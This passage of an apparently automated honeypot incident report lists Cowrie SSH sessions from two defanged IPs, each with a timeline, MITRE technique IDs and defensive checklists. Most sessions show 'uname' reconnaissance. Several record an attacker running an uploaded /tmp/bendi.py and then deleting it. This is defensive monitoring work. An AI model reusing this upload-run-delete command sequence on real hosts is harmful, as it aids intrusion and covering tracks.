| `2026-06-25 14:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8e2055aa3bc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:28 |
| **Last Seen** | 2026-06-25 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:28:07` | `cowrie.session.connect` |
| `2026-06-25 14:28:07` | `cowrie.client.version` |
| `2026-06-25 14:28:07` | `cowrie.client.kex` |
| `2026-06-25 14:28:08` | `cowrie.login.success` |
| `2026-06-25 14:28:08` | `cowrie.session.params` |
| `2026-06-25 14:28:08` | `cowrie.command.input` |
| `2026-06-25 14:28:09` | `cowrie.log.closed` |
| `2026-06-25 14:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff1f46dc369

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:28 |
| **Last Seen** | 2026-06-25 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:28:57` | `cowrie.session.connect` |
| `2026-06-25 14:28:57` | `cowrie.client.version` |
| `2026-06-25 14:28:57` | `cowrie.client.kex` |
| `2026-06-25 14:28:57` | `cowrie.login.success` |
| `2026-06-25 14:28:58` | `cowrie.session.params` |
| `2026-06-25 14:28:58` | `cowrie.command.input` |
| `2026-06-25 14:28:58` | `cowrie.log.closed` |
| `2026-06-25 14:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e84c76a71a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:29 |
| **Last Seen** | 2026-06-25 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:29:45` | `cowrie.session.connect` |
| `2026-06-25 14:29:45` | `cowrie.client.version` |
| `2026-06-25 14:29:45` | `cowrie.client.kex` |
| `2026-06-25 14:29:45` | `cowrie.login.success` |
| `2026-06-25 14:29:46` | `cowrie.session.params` |
| `2026-06-25 14:29:46` | `cowrie.command.input` |
| `2026-06-25 14:29:46` | `cowrie.log.closed` |
| `2026-06-25 14:29:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d170ce78a461

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:30 |
| **Last Seen** | 2026-06-25 14:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:30:32` | `cowrie.session.connect` |
| `2026-06-25 14:30:32` | `cowrie.client.version` |
| `2026-06-25 14:30:32` | `cowrie.client.kex` |
| `2026-06-25 14:30:32` | `cowrie.login.success` |
| `2026-06-25 14:30:33` | `cowrie.session.params` |
| `2026-06-25 14:30:33` | `cowrie.command.input` |
| `2026-06-25 14:30:33` | `cowrie.log.closed` |
| `2026-06-25 14:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f88edfa9de95

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:31 |
| **Last Seen** | 2026-06-25 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:31:19` | `cowrie.session.connect` |
| `2026-06-25 14:31:19` | `cowrie.client.version` |
| `2026-06-25 14:31:19` | `cowrie.client.kex` |
| `2026-06-25 14:31:20` | `cowrie.login.success` |
| `2026-06-25 14:31:21` | `cowrie.session.params` |
| `2026-06-25 14:31:21` | `cowrie.command.input` |
| `2026-06-25 14:31:21` | `cowrie.log.closed` |
| `2026-06-25 14:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec96bf55d7d8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:32 |
| **Last Seen** | 2026-06-25 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:32:10` | `cowrie.session.connect` |
| `2026-06-25 14:32:10` | `cowrie.client.version` |
| `2026-06-25 14:32:10` | `cowrie.client.kex` |
| `2026-06-25 14:32:10` | `cowrie.login.success` |
| `2026-06-25 14:32:11` | `cowrie.session.params` |
| `2026-06-25 14:32:11` | `cowrie.command.input` |
| `2026-06-25 14:32:11` | `cowrie.log.closed` |
| `2026-06-25 14:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfdf5360569b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:33 |
| **Last Seen** | 2026-06-25 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:33:03` | `cowrie.session.connect` |
| `2026-06-25 14:33:03` | `cowrie.client.version` |
| `2026-06-25 14:33:03` | `cowrie.client.kex` |
| `2026-06-25 14:33:03` | `cowrie.login.success` |
| `2026-06-25 14:33:04` | `cowrie.session.params` |
| `2026-06-25 14:33:04` | `cowrie.command.input` |
| `2026-06-25 14:33:04` | `cowrie.log.closed` |
| `2026-06-25 14:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43e42126f26d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:33 |
| **Last Seen** | 2026-06-25 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:33:52` | `cowrie.session.connect` |
| `2026-06-25 14:33:52` | `cowrie.client.version` |
| `2026-06-25 14:33:52` | `cowrie.client.kex` |
| `2026-06-25 14:33:53` | `cowrie.login.success` |
| `2026-06-25 14:33:54` | `cowrie.session.params` |
| `2026-06-25 14:33:54` | `cowrie.command.input` |
| `2026-06-25 14:33:54` | `cowrie.log.closed` |
| `2026-06-25 14:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-864032ab3a2a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:34 |
| **Last Seen** | 2026-06-25 14:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:34:43` | `cowrie.session.connect` |
| `2026-06-25 14:34:43` | `cowrie.client.version` |
| `2026-06-25 14:34:43` | `cowrie.client.kex` |
| `2026-06-25 14:34:43` | `cowrie.login.success` |
| `2026-06-25 14:34:44` | `cowrie.session.params` |
| `2026-06-25 14:34:44` | `cowrie.command.input` |
| `2026-06-25 14:34:44` | `cowrie.log.closed` |
| `2026-06-25 14:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e97fb8f112a3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:35 |
| **Last Seen** | 2026-06-25 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:35:32` | `cowrie.session.connect` |
| `2026-06-25 14:35:32` | `cowrie.client.version` |
| `2026-06-25 14:35:32` | `cowrie.client.kex` |
| `2026-06-25 14:35:32` | `cowrie.login.success` |
| `2026-06-25 14:35:33` | `cowrie.session.params` |
| `2026-06-25 14:35:33` | `cowrie.command.input` |
| `2026-06-25 14:35:33` | `cowrie.log.closed` |
| `2026-06-25 14:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a7f02ff901

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:36 |
| **Last Seen** | 2026-06-25 14:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:36:21` | `cowrie.session.connect` |
| `2026-06-25 14:36:21` | `cowrie.client.version` |
| `2026-06-25 14:36:21` | `cowrie.client.kex` |
| `2026-06-25 14:36:21` | `cowrie.login.success` |
| `2026-06-25 14:36:22` | `cowrie.session.params` |
| `2026-06-25 14:36:22` | `cowrie.command.input` |
| `2026-06-25 14:36:22` | `cowrie.log.closed` |
| `2026-06-25 14:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347bd56520da

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:37 |
| **Last Seen** | 2026-06-25 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:37:13` | `cowrie.session.connect` |
| `2026-06-25 14:37:13` | `cowrie.client.version` |
| `2026-06-25 14:37:13` | `cowrie.client.kex` |
| `2026-06-25 14:37:14` | `cowrie.login.success` |
| `2026-06-25 14:37:14` | `cowrie.session.params` |
| `2026-06-25 14:37:14` | `cowrie.command.input` |
| `2026-06-25 14:37:14` | `cowrie.log.closed` |
| `2026-06-25 14:37:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65dbfa5d413

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:38 |
| **Last Seen** | 2026-06-25 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:38:04` | `cowrie.session.connect` |
| `2026-06-25 14:38:04` | `cowrie.client.version` |
| `2026-06-25 14:38:04` | `cowrie.client.kex` |
| `2026-06-25 14:38:04` | `cowrie.login.success` |
| `2026-06-25 14:38:05` | `cowrie.session.params` |
| `2026-06-25 14:38:05` | `cowrie.command.input` |
| `2026-06-25 14:38:05` | `cowrie.log.closed` |
| `2026-06-25 14:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90801b69275

| Field | Detail |
|---|---|
| **Source IP** | `64.110.100[.]142` |
| **First Seen** | 2026-06-25 14:38 |
| **Last Seen** | 2026-06-25 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:38:16` | `cowrie.session.connect` |
| `2026-06-25 14:38:16` | `cowrie.client.version` |
| `2026-06-25 14:38:17` | `cowrie.client.kex` |
| `2026-06-25 14:38:17` | `cowrie.login.success` |
| `2026-06-25 14:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.100[.]142` to AbuseIPDB if not already reported
- [ ] Block `64.110.100[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857c36d287a0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.100[.]142` |
| **First Seen** | 2026-06-25 14:38 |
| **Last Seen** | 2026-06-25 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:38:16` | `cowrie.session.connect` |
| `2026-06-25 14:38:16` | `cowrie.client.version` |
| `2026-06-25 14:38:17` | `cowrie.client.kex` |
| `2026-06-25 14:38:17` | `cowrie.login.success` |
| `2026-06-25 14:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.100[.]142` to AbuseIPDB if not already reported
- [ ] Block `64.110.100[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-286b33a8d743

| Field | Detail |
|---|---|
| **Source IP** | `64.110.100[.]142` |
| **First Seen** | 2026-06-25 14:38 |
| **Last Seen** | 2026-06-25 14:40 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:38:38` | `cowrie.session.connect` |
| `2026-06-25 14:38:38` | `cowrie.client.version` |
| `2026-06-25 14:38:38` | `cowrie.client.kex` |
| `2026-06-25 14:38:39` | `cowrie.login.success` |
| `2026-06-25 14:38:41` | `cowrie.session.file_upload` |
| `2026-06-25 14:38:41` | `cowrie.session.params` |
| `2026-06-25 14:38:41` | `cowrie.command.input` |
| `2026-06-25 14:38:41` | `cowrie.command.input` |
| `2026-06-25 14:38:41` | `cowrie.command.input` |
| `2026-06-25 14:38:41` | `cowrie.command.failed` |
| `2026-06-25 14:38:42` | `cowrie.log.closed` |
| `2026-06-25 14:38:43` | `cowrie.session.params` |
| `2026-06-25 14:38:43` | `cowrie.command.input` |
| `2026-06-25 14:38:43` | `cowrie.log.closed` |
| `2026-06-25 14:38:44` | `cowrie.session.params` |
| `2026-06-25 14:38:44` | `cowrie.command.input` |
| `2026-06-25 14:38:44` | `cowrie.log.closed` |
| `2026-06-25 14:38:45` | `cowrie.session.params` |
| `2026-06-25 14:38:45` | `cowrie.command.input` |
| `2026-06-25 14:38:45` | `cowrie.command.failed` |
| `2026-06-25 14:38:45` | `cowrie.command.failed` |
| `2026-06-25 14:39:46` | `cowrie.session.params` |
| `2026-06-25 14:39:46` | `cowrie.command.input` |
| `2026-06-25 14:40:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.100[.]142` to AbuseIPDB if not already reported
- [ ] Block `64.110.100[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26a4e5e7dca

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:38 |
| **Last Seen** | 2026-06-25 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:38:57` | `cowrie.session.connect` |
| `2026-06-25 14:38:57` | `cowrie.client.version` |
| `2026-06-25 14:38:58` | `cowrie.client.kex` |
| `2026-06-25 14:38:58` | `cowrie.login.success` |
| `2026-06-25 14:38:59` | `cowrie.session.params` |
| `2026-06-25 14:38:59` | `cowrie.command.input` |
| `2026-06-25 14:38:59` | `cowrie.log.closed` |
| `2026-06-25 14:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7734a1dd2fe5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:39 |
| **Last Seen** | 2026-06-25 14:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:39:51` | `cowrie.session.connect` |
| `2026-06-25 14:39:51` | `cowrie.client.version` |
| `2026-06-25 14:39:51` | `cowrie.client.kex` |
| `2026-06-25 14:39:51` | `cowrie.login.success` |
| `2026-06-25 14:39:52` | `cowrie.session.params` |
| `2026-06-25 14:39:52` | `cowrie.command.input` |
| `2026-06-25 14:39:52` | `cowrie.log.closed` |
| `2026-06-25 14:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448cac3e3342

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:40 |
| **Last Seen** | 2026-06-25 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:40:41` | `cowrie.session.connect` |
| `2026-06-25 14:40:41` | `cowrie.client.version` |
| `2026-06-25 14:40:41` | `cowrie.client.kex` |
| `2026-06-25 14:40:42` | `cowrie.login.success` |
| `2026-06-25 14:40:43` | `cowrie.session.params` |
| `2026-06-25 14:40:43` | `cowrie.command.input` |
| `2026-06-25 14:40:43` | `cowrie.log.closed` |
| `2026-06-25 14:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6482418806a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.100[.]142` |
| **First Seen** | 2026-06-25 14:41 |
| **Last Seen** | 2026-06-25 14:43 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:41:02` | `cowrie.session.connect` |
| `2026-06-25 14:41:02` | `cowrie.client.version` |
| `2026-06-25 14:41:02` | `cowrie.client.kex` |
| `2026-06-25 14:41:03` | `cowrie.login.success` |
| `2026-06-25 14:41:04` | `cowrie.session.file_upload` |
| `2026-06-25 14:41:06` | `cowrie.session.params` |
| `2026-06-25 14:41:06` | `cowrie.command.input` |
| `2026-06-25 14:41:06` | `cowrie.command.input` |
| `2026-06-25 14:41:06` | `cowrie.command.input` |
| `2026-06-25 14:41:06` | `cowrie.command.failed` |
| `2026-06-25 14:41:06` | `cowrie.log.closed` |
| `2026-06-25 14:41:07` | `cowrie.session.params` |
| `2026-06-25 14:41:07` | `cowrie.command.input` |
| `2026-06-25 14:41:07` | `cowrie.log.closed` |
| `2026-06-25 14:41:08` | `cowrie.session.params` |
| `2026-06-25 14:41:08` | `cowrie.command.input` |
| `2026-06-25 14:41:08` | `cowrie.log.closed` |
| `2026-06-25 14:41:09` | `cowrie.session.params` |
| `2026-06-25 14:41:09` | `cowrie.command.input` |
| `2026-06-25 14:41:09` | `cowrie.command.failed` |
| `2026-06-25 14:41:09` | `cowrie.command.failed` |
| `2026-06-25 14:42:10` | `cowrie.session.params` |
| `2026-06-25 14:42:10` | `cowrie.command.input` |
| `2026-06-25 14:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.100[.]142` to AbuseIPDB if not already reported
- [ ] Block `64.110.100[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-247f6bf6b068

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:41 |
| **Last Seen** | 2026-06-25 14:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:41:31` | `cowrie.session.connect` |
| `2026-06-25 14:41:31` | `cowrie.client.version` |
| `2026-06-25 14:41:31` | `cowrie.client.kex` |
| `2026-06-25 14:41:31` | `cowrie.login.success` |
| `2026-06-25 14:41:32` | `cowrie.session.params` |
| `2026-06-25 14:41:32` | `cowrie.command.input` |
| `2026-06-25 14:41:32` | `cowrie.log.closed` |
| `2026-06-25 14:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb09ffbc973c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:42 |
| **Last Seen** | 2026-06-25 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:42:21` | `cowrie.session.connect` |
| `2026-06-25 14:42:21` | `cowrie.client.version` |
| `2026-06-25 14:42:21` | `cowrie.client.kex` |
| `2026-06-25 14:42:21` | `cowrie.login.success` |
| `2026-06-25 14:42:22` | `cowrie.session.params` |
| `2026-06-25 14:42:22` | `cowrie.command.input` |
| `2026-06-25 14:42:22` | `cowrie.log.closed` |
| `2026-06-25 14:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2a1fa01f94

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:43 |
| **Last Seen** | 2026-06-25 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:43:13` | `cowrie.session.connect` |
| `2026-06-25 14:43:13` | `cowrie.client.version` |
| `2026-06-25 14:43:13` | `cowrie.client.kex` |
| `2026-06-25 14:43:13` | `cowrie.login.success` |
| `2026-06-25 14:43:14` | `cowrie.session.params` |
| `2026-06-25 14:43:14` | `cowrie.command.input` |
| `2026-06-25 14:43:14` | `cowrie.log.closed` |
| `2026-06-25 14:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ec7f3e438a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:44 |
| **Last Seen** | 2026-06-25 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:44:05` | `cowrie.session.connect` |
| `2026-06-25 14:44:05` | `cowrie.client.version` |
| `2026-06-25 14:44:05` | `cowrie.client.kex` |
| `2026-06-25 14:44:05` | `cowrie.login.success` |
| `2026-06-25 14:44:06` | `cowrie.session.params` |
| `2026-06-25 14:44:06` | `cowrie.command.input` |
| `2026-06-25 14:44:06` | `cowrie.log.closed` |
| `2026-06-25 14:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
